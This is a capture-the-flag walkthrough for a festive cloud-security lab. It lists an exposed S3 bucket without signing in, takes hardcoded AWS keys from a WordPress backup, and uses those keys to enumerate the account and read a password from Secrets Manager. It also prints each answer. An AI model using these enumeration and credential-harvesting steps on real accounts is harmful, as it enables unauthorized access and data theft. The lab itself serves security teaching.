# `[Cloud]` Elf Leaks

## Story
>In a move to taunt the Best Festival Company, Grinch Enterprises sends out an email to the entire company with everyone's name and date of birth. McSkidy looks quite stressed with the breach and thinks about the potential legal consequences. She talks to McInfra to try to determine the origin of the breach.

## Challenge
>Somehow, the Grinch has managed to get hold of all the Elves' names and email addresses. How could this have happened? Given the scope of the breach, McSkidy believes someone in HR must be involved. You know that HR recently launched a new portal site using WordPress. You also know that HR didn't request any infrastructure from IT to deploy this portal site. Where is that portal hosted?
>
>Here is the image HR sent out announcing the new site:
>
>![img](AdditionalFiles/flyer.png)
>
>Based on that, can you figure out how the Grinch got access to the employee database?

### What is the name of the S3 Bucket used to host the HR Website announcement? `******.*******************.***`

I right-clicked the image and opened it in a new tab. This showed me the URL it was coming from.

<details>
  <summary>Answer:</summary>

```
images.bestfestivalcompany.com
```
</details>

### What is the message left in the flag.txt object from that bucket? `**** **** ** *** **** ***** **** **** *** ***** ** ** **** ** *****`

```
$ aws s3 cp s3://images.bestfestivalcompany.com/flag.txt . --no-sign-request
download: s3://images.bestfestivalcompany.com/flag.txt to ./flag.txt
$ cat flag.txt 
It's easy to get your elves data when you leave it so easy to find!
```

<details>
  <summary>Answer:</summary>

```
It's easy to get your elves data when you leave it so easy to find!
```
</details>

### What other file in that bucket looks interesting to you? `*********.***`

```
$ aws s3 ls s3://images.bestfestivalcompany.com/ --no-sign-request
2021-11-13 15:06:51       6148 .DS_Store
2021-11-13 12:43:03     108420 0vF39p3.png
2021-11-27 11:55:21     705191 AWSConsole.png
2021-11-13 12:43:03       5652 aws-logo.png
2021-11-13 15:06:51         68 flag.txt
2021-11-13 15:06:51    2349068 flyer.png
2021-11-13 12:43:03      92531 presents.jpg
2021-11-13 12:43:03       4680 tree.png
2021-11-23 23:52:22   16556739 wp-backup.zip
```

Out of all of those, I would say `wp-backup.zip` simply as it could contain a lot of information.

<details>
  <summary>Answer:</summary>

```
wp-backup.zip
```
</details>

### What is the AWS Access Key ID in that file? `********************`

```
aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request
unzip wp-backup.zip
cd wp-backup/
less wp-config.php
```
I then came across the following in the file:

```
...
define('S3_UPLOADS_BUCKET', 'images.bestfestivalcompany.com');
define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');
define('S3_UPLOADS_SECRET', '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');
define('S3_UPLOADS_REGION', 'us-east-1');
...
```
<details>
  <summary>Answer:</summary>

```
AKIAQI52OJVCPZXFYAOI
```
</details>

### What is the AWS Account ID that access-key works for? `************`

```
$ aws configure --profile martrewes
AWS Access Key ID [None]: AKIAQI52OJVCPZXFYAOI
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
```
```
$ aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile martrewes
{
    "Account": "019181489476"
}

```
<details>
  <summary>Answer:</summary>

```
019181489476
```
</details>

### What is the Username for that access-key? `***********.***`

```
$ aws sts get-caller-identity --profile martrewes
{
    "UserId": "AIDAQI52OJVCFHT3E73BO",
    "Account": "019181489476",
    "Arn": "arn:aws:iam::019181489476:user/ElfMcHR@bfc.com"
}
```
<details>
  <summary>Answer:</summary>

```
ElfMcHR@bfc.com
```
</details>


### There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance? `*********`

```
aws ec2 describe-instances --output text --profile martrewes > instances.txt
```

<details>
  <summary>Answer:</summary>

```
HR-Portal
```
</details>

### What is the database password stored in Secrets Manager? `***********`

```
aws secretsmanager list-secrets --profile martrewes > secrets.txt
$ aws secretsmanager get-secret-value --secret-id HR-Password --profile martrewes
{
    "ARN": "arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF",
    "Name": "HR-Password",
    "VersionId": "70630b3c-4fbe-4a24-885d-18445bd808b1",
    "SecretString": "The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives.",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2021-11-24T01:29:07.718000+00:00"
}
```
*Getting closer*

```
$ aws secretsmanager get-secret-value --secret-id HR-Password --profile martrewes --region eu-north-1
{
    "ARN": "arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-KIJEvK",
    "Name": "HR-Password",
    "VersionId": "f806c3cd-ea20-4a1a-948f-80927f3ad366",
    "SecretString": "Winter2021!",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2021-11-13T13:26:19.996000+00:00"
}
```

<details>
  <summary>Answer:</summary>

```
Winter2021!
```
</details>